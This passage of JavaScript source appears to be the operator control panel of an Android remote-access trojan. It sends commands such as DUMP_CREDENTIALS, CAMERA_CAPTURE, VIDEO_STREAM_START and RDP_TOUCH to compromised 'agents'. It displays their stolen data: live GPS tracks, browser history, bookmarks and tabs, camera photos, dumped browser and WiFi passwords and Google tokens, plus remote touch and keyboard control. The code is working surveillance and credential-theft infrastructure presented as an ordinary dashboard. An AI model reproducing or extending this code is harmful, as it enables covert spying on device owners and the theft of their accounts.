            <span style="color:#4a5a6a;font-size:10px;min-width:80px;">${time}</span>
            <span style="color:#00d2ff;font-weight:bold;">${loc.latitude}, ${loc.longitude}</span>
            <span style="color:#6b7a8a;font-size:10px;min-width:40px;">${loc.accuracy || 'N/A'}m</span>
            <a href="https://maps.google.com/?q=${loc.latitude},${loc.longitude}" target="_blank" style="color:#ffd93d;text-decoration:none;font-size:14px;">🗺️</a>
        `;
        list.appendChild(div);
    });
}

function handleLocationUpdate(data) {
    // Real-time location update from WebSocket
    const container = DOM.locationContent;
    if (!container) return;
    
    const location = data.data || {};
    
    // Update status card if exists
    const statusCard = container.querySelector('.tracking-status-card');
    if (statusCard) {
        // Update coordinates
        const latDiv = statusCard.querySelector('.location-coords div:first-child .value');
        const lngDiv = statusCard.querySelector('.location-coords div:last-child .value');
        const timeSpan = statusCard.querySelector('.location-details .time');
        const accuracySpan = statusCard.querySelector('.location-details .accuracy');
        const providerSpan = statusCard.querySelector('.location-details .provider');
        
        if (latDiv) latDiv.textContent = location.latitude || 'N/A';
        if (lngDiv) lngDiv.textContent = location.longitude || 'N/A';
        if (timeSpan) timeSpan.textContent = location.time || new Date().toLocaleString();
        if (accuracySpan) accuracySpan.textContent = (location.accuracy || 'N/A') + 'm';
        if (providerSpan) providerSpan.textContent = location.provider || 'N/A';
    }
    
    // Add to history if exists
    const list = container.querySelector('.history-list');
    if (list) {
        const div = document.createElement('div');
        div.style.cssText = `
            display: flex;
            justify-content: space-between;
            align-items: center;
            padding: 4px 8px;
            border-bottom: 1px solid #0a0e17;
            background: #0d1520;
            border-radius: 3px;
            animation: slideIn 0.3s ease;
        `;
        
        const time = location.time || new Date().toLocaleString();
        div.innerHTML = `
            <span style="color:#51cf66;font-size:10px;min-width:80px;">● ${time}</span>
            <span style="color:#00d2ff;font-weight:bold;">${location.latitude || 'N/A'}, ${location.longitude || 'N/A'}</span>
            <span style="color:#6b7a8a;font-size:10px;min-width:40px;">${location.accuracy || 'N/A'}m</span>
            <a href="https://maps.google.com/?q=${location.latitude},${location.longitude}" target="_blank" style="color:#ffd93d;text-decoration:none;font-size:14px;">🗺️</a>
        `;
        list.prepend(div);
        
        // Limit history items
        while (list.children.length > 100) {
            list.removeChild(list.lastChild);
        }
    }
}

function clearLocationHistoryUI() {
    const container = DOM.locationContent;
    const list = container.querySelector('.history-list');
    if (list) {
        list.innerHTML = '';
        addOutputLine('🗑️ Location history cleared from UI', 'info');
    }
}

// ==================== BROWSER DATA HANDLER ====================

function handleBrowserData(data) {
    console.log('🌐 Browser data received:', data);
    
    switch (data.type) {
        case 'browser_info':
            showBrowserInfo(data);
            break;
        case 'browser_history':
            showBrowserHistory(data);
            break;
        case 'browser_bookmarks':
            showBrowserBookmarks(data);
            break;
        case 'browser_tabs':
            showBrowserTabs(data);
            break;
        case 'browser_all':
            showBrowserAll(data);
            break;
    }
}

function showBrowserInfo(data) {
    const container = document.getElementById('browser-content') || createBrowserTab();
    const result = data.data || {};
    const browsers = result.data || [];
    
    container.innerHTML = `
        <div class="browser-info-card">
            <div class="browser-header">
                <h3>🌐 Browser Info</h3>
                <span style="color:#6b7a8a;font-size:11px;">${new Date().toLocaleString()}</span>
            </div>
            <div class="browser-list">
                ${browsers.length === 0 ? '<div class="info">No browsers found</div>' : 
                browsers.map(b => `
                    <div class="browser-item">
                        <span class="browser-name">${b.name}</span>
                        <span class="browser-version">v${b.version}</span>
                        <span class="badge badge-success">Installed</span>
                    </div>
                `).join('')}
            </div>
            <div class="browser-actions">
                <button onclick="getBrowserHistory()" class="btn-small">📜 History</button>
                <button onclick="getBrowserBookmarks()" class="btn-small">🔖 Bookmarks</button>
                <button onclick="getBrowserTabs()" class="btn-small">📑 Tabs</button>
            </div>
        </div>
    `;
    
    switchToTab('browser');
}

function showBrowserHistory(data) {
    const container = document.getElementById('browser-content') || createBrowserTab();
    const result = data.data || {};
    const history = result.data || [];
    const browser = result.browser || 'all';
    
    container.innerHTML = `
        <div class="browser-history-card">
            <div class="browser-header">
                <h3>📜 Browser History ${browser !== 'all' ? `(${browser})` : ''}</h3>
                <span style="color:#6b7a8a;font-size:11px;">${history.length} entries</span>
            </div>
            ${history.length === 0 ? '<div class="info">No history found</div>' : 
            `<div class="history-list">
                ${history.map((item, index) => `
                    <div class="history-item" style="background: ${index % 2 === 0 ? '#0d1520' : 'transparent'};">
                        <div class="history-title">${item.title || 'Untitled'}</div>
                        <div class="history-url"><a href="${item.url}" target="_blank">${item.url}</a></div>
                        <div class="history-meta">
                            <span>${item.browser || 'Unknown'}</span>
                            <span>${item.date || ''}</span>
                            <span>Visits: ${item.visits || 0}</span>
                        </div>
                    </div>
                `).join('')}
            </div>`}
        </div>
    `;
    
    switchToTab('browser');
}

function showBrowserBookmarks(data) {
    const container = document.getElementById('browser-content') || createBrowserTab();
    const result = data.data || {};
    const bookmarks = result.data || [];
    const browser = result.browser || 'all';
    
    container.innerHTML = `
        <div class="browser-bookmarks-card">
            <div class="browser-header">
                <h3>🔖 Browser Bookmarks ${browser !== 'all' ? `(${browser})` : ''}</h3>
                <span style="color:#6b7a8a;font-size:11px;">${bookmarks.length} bookmarks</span>
            </div>
            ${bookmarks.length === 0 ? '<div class="info">No bookmarks found</div>' : 
            `<div class="bookmarks-list">
                ${bookmarks.map((item, index) => `
                    <div class="bookmark-item" style="background: ${index % 2 === 0 ? '#0d1520' : 'transparent'};">
                        <div class="bookmark-title">${item.title || 'Untitled'}</div>
                        <div class="bookmark-url"><a href="${item.url}" target="_blank">${item.url}</a></div>
                        <div class="bookmark-meta">
                            <span>${item.browser || 'Unknown'}</span>
                            <span>${item.date || ''}</span>
                        </div>
                    </div>
                `).join('')}
            </div>`}
        </div>
    `;
    
    switchToTab('browser');
}

function showBrowserTabs(data) {
    const container = document.getElementById('browser-content') || createBrowserTab();
    const result = data.data || {};
    const tabs = result.data || [];
    const browser = result.browser || 'all';
    
    container.innerHTML = `
        <div class="browser-tabs-card">
            <div class="browser-header">
                <h3>📑 Open Browser Tabs ${browser !== 'all' ? `(${browser})` : ''}</h3>
                <span style="color:#6b7a8a;font-size:11px;">${tabs.length} tabs</span>
            </div>
            ${tabs.length === 0 ? '<div class="info">No open tabs found</div>' : 
            `<div class="tabs-list">
                ${tabs.map((item, index) => `
                    <div class="tab-item" style="background: ${index % 2 === 0 ? '#0d1520' : 'transparent'};">
                        <div class="tab-title">${item.title || 'Untitled'}</div>
                        <div class="tab-url"><a href="${item.url}" target="_blank">${item.url}</a></div>
                        <div class="tab-meta">
                            <span>${item.browser || 'Unknown'}</span>
                        </div>
                    </div>
                `).join('')}
            </div>`}
        </div>
    `;
    
    switchToTab('browser');
}

function showBrowserAll(data) {
    const result = data.data || {};
    const info = result.info || {};
    const history = result.history || {};
    const bookmarks = result.bookmarks || {};
    const tabs = result.tabs || {};
    
    const container = document.getElementById('browser-content') || createBrowserTab();
    
    container.innerHTML = `
        <div class="browser-all-card">
            <div class="browser-header">
                <h3>🌐 All Browser Data</h3>
                <span style="color:#6b7a8a;font-size:11px;">${new Date().toLocaleString()}</span>
            </div>
            
            <div class="browser-section">
                <h4>📊 Browser Info (${info.data ? info.data.length : 0} browsers)</h4>
                <div class="browser-info-list">
                    ${info.data ? info.data.map(b => 
                        `<span class="browser-tag">${b.name}</span>`
                    ).join('') : 'No browsers'}
                </div>
            </div>
            
            <div class="browser-section">
                <h4>📜 History (${history.data ? history.data.length : 0} entries)</h4>
                <div class="history-list">
                    ${history.data ? history.data.slice(0, 10).map((item, index) => `
                        <div class="history-item" style="background: ${index % 2 === 0 ? '#0d1520' : 'transparent'};">
                            <div class="history-title">${item.title || 'Untitled'}</div>
                            <div class="history-url"><a href="${item.url}" target="_blank">${item.url.substring(0, 50)}...</a></div>
                            <div class="history-meta">
                                <span>${item.browser || 'Unknown'}</span>
                                <span>${item.date || ''}</span>
                            </div>
                        </div>
                    `).join('') : 'No history'}
                    ${history.data && history.data.length > 10 ? `<div class="more-info">... and ${history.data.length - 10} more</div>` : ''}
                </div>
            </div>
            
            <div class="browser-section">
                <h4>🔖 Bookmarks (${bookmarks.data ? bookmarks.data.length : 0} items)</h4>
                <div class="bookmarks-list">
                    ${bookmarks.data ? bookmarks.data.slice(0, 10).map((item, index) => `
                        <div class="bookmark-item" style="background: ${index % 2 === 0 ? '#0d1520' : 'transparent'};">
                            <div class="bookmark-title">${item.title || 'Untitled'}</div>
                            <div class="bookmark-url"><a href="${item.url}" target="_blank">${item.url.substring(0, 50)}...</a></div>
                        </div>
                    `).join('') : 'No bookmarks'}
                    ${bookmarks.data && bookmarks.data.length > 10 ? `<div class="more-info">... and ${bookmarks.data.length - 10} more</div>` : ''}
                </div>
            </div>
            
            <div class="browser-section">
                <h4>📑 Tabs (${tabs.data ? tabs.data.length : 0} open)</h4>
                <div class="tabs-list">
                    ${tabs.data ? tabs.data.map((item, index) => `
                        <div class="tab-item" style="background: ${index % 2 === 0 ? '#0d1520' : 'transparent'};">
                            <div class="tab-title">${item.title || 'Untitled'}</div>
                            <div class="tab-url"><a href="${item.url}" target="_blank">${item.url.substring(0, 50)}...</a></div>
                            <div class="tab-meta">
                                <span>${item.browser || 'Unknown'}</span>
                            </div>
                        </div>
                    `).join('') : 'No open tabs'}
                </div>
            </div>
        </div>
    `;
    
    switchToTab('browser');
}

function createBrowserTab() {
    // Check if browser tab exists
    let container = document.getElementById('browser-tab');
    if (!container) {
        // Check if tab already exists
        const tabContainer = document.getElementById('tabContainer');
        if (tabContainer) {
            const existingTab = tabContainer.querySelector('[data-tab="browser"]');
            if (!existingTab) {
                const tab = document.createElement('button');
                tab.className = 'tab';
                tab.dataset.tab = 'browser';
                tab.textContent = '🌐 Browser';
                tab.style.color = '#8be9fd';
                tabContainer.appendChild(tab);
                tab.addEventListener('click', () => switchToTab('browser'));
            }
        }
        
        // Create browser content
        const outputContainer = document.getElementById('output-container');
        if (outputContainer) {
            const existingContent = document.getElementById('browser-tab');
            if (!existingContent) {
                const content = document.createElement('div');
                content.id = 'browser-tab';
                content.className = 'tab-content';
                content.innerHTML = `
                    <div id="browser-content" style="height:100%;overflow-y:auto;padding:10px 12px;">
                        <div class="info">🌐 Browser data will appear here</div>
                        <div class="info" style="font-size:12px;color:#6b7a8a;margin-top:8px;">
                            Send <code style="background:#1a2633;padding:2px 8px;border-radius:4px;color:#8be9fd;">BROWSER_INFO</code> to get browser info
                        </div>
                    </div>
                `;
                outputContainer.appendChild(content);
            }
        }
        
        container = document.getElementById('browser-content');
    }
    return container;
}

// ==================== CAMERA FRAME HANDLER ====================

function handleCameraFrame(agentId, frame) {
    if (!selectedAgent && agents.length > 0) {
        const agent = agents.find(a => a.id === agentId);
        if (agent) selectAgent(agentId);
    }
    if (selectedAgent !== agentId) return;
    if (frame && frame.data) {
        showCameraPreview(frame);
    }
}

// ==================== VIDEO STREAM FUNCTIONS ====================

function startVideoStream() {
    if (!selectedAgent) {
        addOutputLine('⚠️ Select agent first', 'error');
        return;
    }
    sendCommand('VIDEO_STREAM_START');
    addOutputLine(`🎬 Starting realtime video stream for ${selectedAgent}`, 'info');
    switchToTab('livemirror');
    
    // Tampilkan loading
    const container = DOM.livemirrorContent;
    if (container) {
        container.innerHTML = `
            <div style="text-align:center;padding:30px;color:#00d2ff;">
                <div style="font-size:40px;">🎬</div>
                <div style="font-size:14px;margin-top:8px;">Starting realtime stream...</div>
                <div style="font-size:11px;color:#6b7a8a;margin-top:4px;">Please grant permission on device</div>
            </div>
        `;
    }
}

function stopVideoStream() {
    if (!selectedAgent) {
        addOutputLine('⚠️ Select agent first', 'error');
        return;
    }
    sendCommand('VIDEO_STREAM_STOP');
    addOutputLine(`⏹️ Stopping video stream for ${selectedAgent}`, 'info');
    resetVideoStream();
}

function getVideoStreamStatus() {
    if (!selectedAgent) {
        addOutputLine('⚠️ Select agent first', 'error');
        return;
    }
    sendCommand('VIDEO_STREAM_STATUS');
}

function resetVideoStream() {
    const container = DOM.livemirrorContent;
    if (container) {
        container.innerHTML = `
            <div class="info">🎬 Video Stream</div>
            <div class="info" style="font-size:12px;color:#6b7a8a;margin-top:8px;">
                Start with <code style="background:#1a2633;padding:2px 8px;border-radius:4px;color:#00d2ff;">VIDEO_STREAM_START</code>
            </div>
        `;
    }
}

function showCameraPreview(frame) {
    const container = document.getElementById('camera-content');
    if (!container) return;
    
    // Hapus preview lama (jika ada)
    const oldPreview = container.querySelector('.camera-preview');
    if (oldPreview) {
        oldPreview.remove();
    }
    
    // Cek apakah ini foto (frame_number = -1) atau stream
    const isPhoto = frame.frame_number === -1 || frame.frame_number === undefined;
    
    const wrapper = document.createElement('div');
    wrapper.className = 'camera-preview';
    wrapper.style.cssText = `
        background: #0d1520;
        border-radius: 8px;
        padding: 12px;
        border: 1px solid ${isPhoto ? '#51cf66' : '#00d2ff'};
        margin-bottom: 10px;
        animation: fadeIn 0.3s ease;
    `;
    
    const header = document.createElement('div');
    header.style.cssText = `
        display: flex;
        justify-content: space-between;
        align-items: center;
        margin-bottom: 8px;
        color: #6b7a8a;
        font-size: 11px;
    `;
    const cameraLabel = frame.camera === 'front' ? '🤳 Front Camera' : '📷 Back Camera';
    const typeLabel = isPhoto ? '📸 Photo' : '📹 Stream';
    header.innerHTML = `
        <span style="color:${isPhoto ? '#51cf66' : '#00d2ff'};font-weight:bold;">
            ${cameraLabel} - ${typeLabel}
        </span>
        <span>#${frame.frame_number || 0} • ${new Date().toLocaleTimeString()}</span>
    `;
    wrapper.appendChild(header);
    
    const imgWrapper = document.createElement('div');
    imgWrapper.style.cssText = 'text-align:center;';
    
    const img = document.createElement('img');
    img.src = `data:image/jpeg;base64,${frame.data}`;
    img.style.cssText = `
        max-width: 100%;
        max-height: ${isPhoto ? '500px' : '400px'};
        border-radius: 6px;
        border: 1px solid #1a2633;
        cursor: pointer;
        object-fit: contain;
    `;
    img.onclick = () => window.open(img.src, '_blank');
    imgWrapper.appendChild(img);
    wrapper.appendChild(imgWrapper);
    
    // Actions untuk photo
    if (isPhoto) {
        const actions = document.createElement('div');
        actions.style.cssText = `
            display: flex;
            gap: 8px;
            margin-top: 8px;
            flex-wrap: wrap;
        `;
        
        const downloadBtn = document.createElement('button');
        downloadBtn.textContent = '⬇️ Download';
        downloadBtn.style.cssText = `
            padding: 4px 12px;
            background: #00d2ff;
            color: #0a0e17;
            border: none;
            border-radius: 4px;
            cursor: pointer;
            font-size: 12px;
        `;
        downloadBtn.onclick = () => {
            const link = document.createElement('a');
            link.href = img.src;
            link.download = `camera_${frame.camera || 'back'}_${Date.now()}.jpg`;
            link.click();
        };
        actions.appendChild(downloadBtn);
        
        wrapper.appendChild(actions);
    }
    
    // Tambahkan ke container
    container.prepend(wrapper);
    
    // Batasi jumlah preview
    const previews = container.querySelectorAll('.camera-preview');
    while (previews.length > 10) {
        previews[previews.length - 1].remove();
    }
    
    // Auto switch ke tab camera
    switchToTab('camera');
}



function captureCameraPhoto() {
    if (!selectedAgent) {
        addOutputLine('⚠️ Please select an agent first', 'error');
        return;
    }
    sendCommand('CAMERA_CAPTURE');
    addOutputLine('📸 Capturing photo...', 'info');
}

function getCameraStreamStatus() {
    if (!selectedAgent) {
        addOutputLine('⚠️ Please select an agent first', 'error');
        return;
    }
    sendCommand('CAMERA_STREAM_STATUS');
}

// ==================== CREDENTIALS HANDLERS ====================

function handleCredentialsData(data) {
    const container = document.getElementById('credentials-content') || createCredentialsTab();
    const result = data.data || {};
    
    if (result.status === 'success') {
        let html = `
            <div class="credentials-card">
                <div class="credentials-header">
                    <h3>🔐 Credentials Dump</h3>
                    <span style="color:#6b7a8a;font-size:11px;">${new Date().toLocaleString()}</span>
                </div>
                <div class="credentials-summary">
                    <span>📊 Total Categories: ${result.total || 0}</span>
                    <span>🔓 Root: ${result.is_rooted ? '✅' : '❌'}</span>
                </div>
        `;
        
        const categories = result.data || [];
        categories.forEach(category => {
            const type = category.type || 'unknown';
            const count = category.count || 0;
            const items = category.data || [];
            
            const iconMap = {
                'browser_passwords': '🌐',
                'wifi_passwords': '📶',
                'google_tokens': '🔵',
                'app_credentials': '📱'
            };
            
            html += `
                <div class="credential-category">
                    <div class="category-header" onclick="toggleCategory(this)">
                        <span>${iconMap[type] || '🔐'} ${type.replace('_', ' ').toUpperCase()}</span>
                        <span>${count} items</span>
                    </div>
                    <div class="category-items">
            `;
            
            items.forEach(item => {
                html += `
                    <div class="credential-item">
                        ${Object.keys(item).map(key => `
                            <div class="credential-field">
                                <span class="field-label">${key}:</span>
                                <span class="field-value">${escapeHtml(String(item[key] || ''))}</span>
                            </div>
                        `).join('')}
                    </div>
                `;
            });
            
            html += `
                    </div>
                </div>
            `;
        });
        
        html += `</div>`;
        container.innerHTML = html;
        switchToTab('credentials');
    } else {
        addOutputLine(`❌ Failed to get credentials: ${result.message || 'Unknown error'}`, 'error');
    }
}

function handleWifiData(data) {
    const container = document.getElementById('credentials-content') || createCredentialsTab();
    const result = data.data || {};
    
    if (result.status === 'success') {
        const networks = result.data || [];
        let html = `
            <div class="credentials-card">
                <div class="credentials-header">
                    <h3>📶 WiFi Passwords</h3>
                    <span style="color:#6b7a8a;font-size:11px;">${new Date().toLocaleString()}</span>
                </div>
                <div class="credentials-summary">
                    <span>📊 Total: ${networks.length} networks</span>
                </div>
        `;
        
        networks.forEach((network, index) => {
            html += `
                <div class="credential-item" style="background: ${index % 2 === 0 ? '#0d1520' : 'transparent'};">
                    <div class="credential-field">
                        <span class="field-label">📶 SSID:</span>
                        <span class="field-value" style="color:#ffd93d;">${escapeHtml(network.ssid || 'Unknown')}</span>
                    </div>
                    <div class="credential-field">
                        <span class="field-label">🔑 Password:</span>
                        <span class="field-value" style="color:#51cf66;">${escapeHtml(network.password || 'No password')}</span>
                    </div>
                    <button onclick="copyToClipboard('${escapeHtml(network.password || '')}')" style="background:#1a2633;border:none;color:#00d2ff;padding:2px 8px;border-radius:4px;cursor:pointer;">📋 Copy</button>
                </div>
            `;
        });
        
        html += `</div>`;
        container.innerHTML = html;
        switchToTab('credentials');
    }
}

function createCredentialsTab() {
    let container = document.getElementById('credentials-tab');
    if (!container) {
        const tabContainer = document.getElementById('tabContainer');
        if (tabContainer) {
            const existingTab = tabContainer.querySelector('[data-tab="credentials"]');
            if (!existingTab) {
                const tab = document.createElement('button');
                tab.className = 'tab';
                tab.dataset.tab = 'credentials';
                tab.textContent = '🔐 Credentials';
                tab.style.color = '#ffd93d';
                tabContainer.appendChild(tab);
                tab.addEventListener('click', () => switchToTab('credentials'));
            }
        }
        
        const outputContainer = document.getElementById('output-container');
        if (outputContainer) {
            const content = document.createElement('div');
            content.id = 'credentials-tab';
            content.className = 'tab-content';
            content.innerHTML = `
                <div id="credentials-content" style="height:100%;overflow-y:auto;padding:10px 12px;">
                    <div class="info">🔐 Credentials will appear here</div>
                    <div class="info" style="font-size:12px;color:#6b7a8a;margin-top:8px;">
                        Send <code style="background:#1a2633;padding:2px 8px;border-radius:4px;color:#ffd93d;">DUMP_CREDENTIALS</code> to an agent
                    </div>
                </div>
            `;
            outputContainer.appendChild(content);
        }
        
        container = document.getElementById('credentials-content');
    }
    return container;
}

function toggleCategory(header) {
    const items = header.nextElementSibling;
    if (items) {
        items.style.display = items.style.display === 'none' ? 'block' : 'none';
        header.querySelector('span:last-child').textContent = 
            items.style.display === 'none' ? '▶' : '▼';
    }
}

// Initialize Leaflet map
function initLocationMap() {
    const container = document.getElementById('location-content');
    if (!container) return;
    
    // Check if map container exists
    let mapContainer = document.getElementById('location-map');
    if (!mapContainer) {
        mapContainer = document.createElement('div');
        mapContainer.id = 'location-map';
        mapContainer.style.cssText = `
            width: 100%;
            height: 400px;
            border-radius: 8px;
            border: 1px solid #1a2633;
            background: #0a0e17;
            margin-bottom: 10px;
        `;
        container.prepend(mapContainer);
    }
    
    // Initialize map if not already done
    if (!isMapInitialized) {
        try {
            // Check if Leaflet is loaded
            if (typeof L === 'undefined') {
                // Load Leaflet dynamically
                loadLeafletLibrary(() => {
                    createMap(mapContainer);
                });
            } else {
                createMap(mapContainer);
            }
        } catch (e) {
            console.error('Map initialization error:', e);
            mapContainer.innerHTML = `
                <div style="display:flex;align-items:center;justify-content:center;height:100%;color:#6b7a8a;flex-direction:column;gap:10px;">
                    <div style="font-size:40px;">🗺️</div>
                    <div>Map loading...</div>
                    <div style="font-size:11px;color:#4a5a6a;">Use GET_LOCATION for coordinates</div>
                </div>
            `;
        }
    }
}

function loadLeafletLibrary(callback) {
    // Load CSS
    const link = document.createElement('link');
    link.rel = 'stylesheet';
    link.href = 'https://unpkg.com/leaflet@1.9.4/dist/leaflet.css';
    link.integrity = 'sha256-p4NxAoJBhIIN+hmNHrzRCf9tD/miZyoHS5obTRR9BMY=';
    link.crossOrigin = '';
    document.head.appendChild(link);
    
    // Load JS
    const script = document.createElement('script');
    script.src = 'https://unpkg.com/leaflet@1.9.4/dist/leaflet.js';
    script.integrity = 'sha256-20nQCchB9co0qIjJZRGuk2/Z9VM+kNiyxNV1lvTlZBo=';
    script.crossOrigin = '';
    script.onload = callback;
    document.head.appendChild(script);
}

function createMap(container) {
    try {
        // Initial center (will be updated with location)
        const center = [0, 0];
        
        // ✅ FIX: Changed zoom from 15 to 2 for world view instead of street-level detail at [0,0]
        locationMap = L.map(container.id, {
            center: center,
            zoom: 2,  // ✅ FIXED: Changed from 15 to 2
            zoomControl: true,
            fadeAnimation: true,
            attributionControl: true
        });
        
        // Add tile layer (dark theme)
        L.tileLayer('https://{s}.basemaps.cartocdn.com/dark_all/{z}/{x}/{y}{r}.png', {
            attribution: '&copy; <a href="https://www.openstreetmap.org/copyright">OpenStreetMap</a>, &copy; CartoDB',
            subdomains: 'abcd',
            maxZoom: 19
        }).addTo(locationMap);
        
        // Custom marker icon
        const icon = L.divIcon({
            className: 'custom-marker',
            html: '<div style="background:#ff6b6b;width:16px;height:16px;border-radius:50%;border:3px solid #fff;box-shadow:0 0 20px rgba(255,107,107,0.5);"></div>',
            iconSize: [16, 16],
            iconAnchor: [8, 8]
        });
        
        locationMarker = L.marker(center, { icon: icon }).addTo(locationMap);
        
        // Polyline for path
        locationPolyline = L.polyline([], {
            color: '#00d2ff',
            weight: 3,
            opacity: 0.8,
            dashArray: '5, 10'
        }).addTo(locationMap);
        
        isMapInitialized = true;
        
        // Resize map after initialization
        setTimeout(() => {
            if (locationMap) {
                locationMap.invalidateSize();
            }
        }, 500);
        
        console.log('✅ Map initialized');
        
        // Show last known location if available
        if (locationTrackingData.length > 0) {
            updateMapWithLocation(locationTrackingData[locationTrackingData.length - 1]);
        }
        
    } catch (e) {
        console.error('Create map error:', e);
        container.innerHTML = `
            <div style="display:flex;align-items:center;justify-content:center;height:100%;color:#ff6b6b;flex-direction:column;gap:10px;">
                <div style="font-size:40px;">❌</div>
                <div>Map failed to load</div>
                <div style="font-size:11px;color:#4a5a6a;">${e.message}</div>
            </div>
        `;
    }
}

function updateMapWithLocation(locationData) {
    // ✅ FIX: Validate input
    if (!locationData) {
        console.warn('⚠️ No location data provided');
        return;
    }
    
    const lat = locationData.latitude || locationData.lat;
    const lng = locationData.longitude || locationData.lng;
    
    // ✅ FIX: Reject coordinates [0, 0] - this is invalid location
    if ((!lat || !lng) || (lat === 0 && lng === 0)) {
        console.warn('⚠️ Invalid coordinates, rejecting:', { lat, lng });
        return;
    }
    
    // ✅ FIX: Validate coordinates are numbers
    if (typeof lat !== 'number' || typeof lng !== 'number') {
        console.warn('⚠️ Coordinates are not numbers:', typeof lat, typeof lng);
        return;
    }
    
    // ✅ FIX: Check range latitude/longitude
    if (lat < -90 || lat > 90 || lng < -180 || lng > 180) {
        console.warn('⚠️ Coordinates out of valid range:', { lat, lng });
        return;
    }
    
    // ✅ FIX: Initialize map if not yet done
    if (!isMapInitialized || !locationMap) {
        console.log('📍 Map not initialized yet, storing data for later:', locationData);
        locationTrackingData.push(locationData);
        return;
    }
    
    try {
        
        const latLng = [lat, lng];
        
        console.log('✅ Updating map with location:', latLng);
        
        // Update marker position
        if (locationMarker) {
            locationMarker.setLatLng(latLng);
            console.log('  ✓ Marker updated');
        }
        
        // Add to path
        locationPath.push(latLng);
        if (locationPolyline) {
            locationPolyline.setLatLngs(locationPath);
            console.log('  ✓ Polyline updated, path length:', locationPath.length);
        }
        
        // ✅ FIX: Use setView() instead of panTo() to properly zoom to location
        // panTo() only pans but doesn't change zoom level
        // setView() both pans and zooms to the proper level
        if (locationMap) {
            locationMap.setView(latLng, 15, {  // Zoom to 15 for device detail
                animate: true,
                duration: 1
            });
            console.log('  ✓ Map view centered at zoom 15');
        }
        
        // Add to data
        locationTrackingData.push(locationData);
        
        // Update info panel
        updateLocationInfo(locationData);
        
    } catch (e) {
        console.error('Update map error:', e);
    }
}

function updateLocationInfo(locationData) {
    const container = document.getElementById('location-content');
    if (!container) {
        console.warn('⚠️ location-content container not found');
        return;
    }
    
    // ✅ FIX: Validate input
    if (!locationData) {
        console.warn('⚠️ No location data to display');
        return;
    }
    
    // ✅ FIX: Validate coordinates before showing
    const lat = locationData.latitude || locationData.lat;
    const lng = locationData.longitude || locationData.lng;
    
    // Only show if we have valid coordinates
    if (!lat || !lng || (lat === 0 && lng === 0)) {
        console.warn('⚠️ Invalid coordinates for info panel:', { lat, lng });
        return;
    }
    
    // Remove old info panel if exists
    const oldInfo = container.querySelector('.location-info-panel');
    if (oldInfo) oldInfo.remove();
    
    const infoPanel = document.createElement('div');
    infoPanel.className = 'location-info-panel';
    infoPanel.style.cssText = `
        background: #0d1520;
        border-radius: 8px;
        padding: 12px 16px;
        border: 1px solid #1a2633;
        margin-top: 10px;
        display: grid;
        grid-template-columns: repeat(auto-fit, minmax(140px, 1fr));
        gap: 8px;
        font-size: 12px;
    `;
    
    const fields = [
        { label: '📍 Latitude', value: locationData.latitude || locationData.lat || 'N/A' },
        { label: '📍 Longitude', value: locationData.longitude || locationData.lng || 'N/A' },
        { label: '🎯 Accuracy', value: locationData.accuracy ? locationData.accuracy + 'm' : 'N/A' },
        { label: '📶 Provider', value: locationData.provider || 'N/A' },
        { label: '🕐 Time', value: locationData.time || locationData.timestamp || new Date().toLocaleString() },
        { label: '📊 Points', value: locationPath.length + ' tracked' }
    ];
    
    fields.forEach(field => {
        const div = document.createElement('div');
        div.style.cssText = `
            background: #0a0e17;
            padding: 6px 10px;
            border-radius: 4px;
            border: 1px solid #1a2633;
        `;
        div.innerHTML = `
            <div style="color:#6b7a8a;font-size:9px;">${field.label}</div>
            <div style="color:#c8d6e5;font-family:'Courier New',monospace;font-size:12px;font-weight:bold;">${field.value}</div>
        `;
        infoPanel.appendChild(div);
    });
    
    container.appendChild(infoPanel);
}

function setupRDPControls() {
    // RDP Mouse toggle
    document.getElementById('rdp-mouse-toggle')?.addEventListener('click', function() {
        rdpMode = !rdpMode;
        this.textContent = rdpMode ? '🖱️ ON' : '🖱️ Mouse';
        this.style.background = rdpMode ? '#51cf66' : '#0a0e17';
        this.style.color = rdpMode ? '#0a0e17' : '#51cf66';
        addOutputLine(`🖱️ RDP Mouse ${rdpMode ? 'ENABLED' : 'DISABLED'}`, 'info');
        
        const video = document.getElementById('live-mirror-video');
        if (video) {
            video.style.cursor = rdpMode ? 'crosshair' : 'default';
        }
    });
    
    // RDP Keyboard
    document.getElementById('rdp-keyboard')?.addEventListener('click', function() {
        const text = prompt('📝 Enter text to type:');
        if (text && selectedAgent) {
            sendCommand('RDP_TEXT', text);
            addOutputLine(`⌨️ Typing: ${text}`, 'info');
        }
    });
    
    // RDP Scroll
    document.getElementById('rdp-scroll-up')?.addEventListener('click', function() {
        if (selectedAgent) {
            sendCommand('RDP_SCROLL', '50');
            addOutputLine('📜 Scroll up', 'info');
        }
    });
    
    document.getElementById('rdp-scroll-down')?.addEventListener('click', function() {
        if (selectedAgent) {
            sendCommand('RDP_SCROLL', '-50');
            addOutputLine('📜 Scroll down', 'info');
        }
    });
    
    // RDP System
    document.getElementById('rdp-back')?.addEventListener('click', function() {
        if (selectedAgent) {
            sendCommand('RDP_BACK');
            addOutputLine('🔙 Back', 'info');
        }
    });
    
    document.getElementById('rdp-home')?.addEventListener('click', function() {
        if (selectedAgent) {
            sendCommand('RDP_HOME');
            addOutputLine('🏠 Home', 'info');
        }
    });
    
    document.getElementById('rdp-recent')?.addEventListener('click', function() {
        if (selectedAgent) {
            sendCommand('RDP_RECENT');
            addOutputLine('📋 Recent', 'info');
        }
    });
    
    document.getElementById('rdp-fullscreen')?.addEventListener('click', function() {
        const video = document.getElementById('live-mirror-video');
        if (video) {
            if (video.requestFullscreen) video.requestFullscreen();
            else if (video.webkitRequestFullscreen) video.webkitRequestFullscreen();
        }
    });
    
    // Mouse click on video
    document.addEventListener('click', function(e) {
        if (!rdpMode || !selectedAgent) return;
        const video = document.getElementById('live-mirror-video');
        if (!video) return;
        
        const rect = video.getBoundingClientRect();
        const x = ((e.clientX - rect.left) / rect.width) * 100;
        const y = ((e.clientY - rect.top) / rect.height) * 100;
        
        if (x >= 0 && x <= 100 && y >= 0 && y <= 100) {
            sendCommand('RDP_TOUCH', `${Math.round(x)},${Math.round(y)}`);
        }
    });
    
    // Drag / Swipe
    let isDragging = false;
    let dragStartX = 0, dragStartY = 0;
    
    document.addEventListener('mousedown', function(e) {
        if (!rdpMode || !selectedAgent) return;
        const video = document.getElementById('live-mirror-video');
        if (!video) return;
        const rect = video.getBoundingClientRect();
        if (e.clientX >= rect.left && e.clientX <= rect.right &&
            e.clientY >= rect.top && e.clientY <= rect.bottom) {
            isDragging = true;
            dragStartX = ((e.clientX - rect.left) / rect.width) * 100;
            dragStartY = ((e.clientY - rect.top) / rect.height) * 100;
        }
    });
    
    document.addEventListener('mouseup', function(e) {
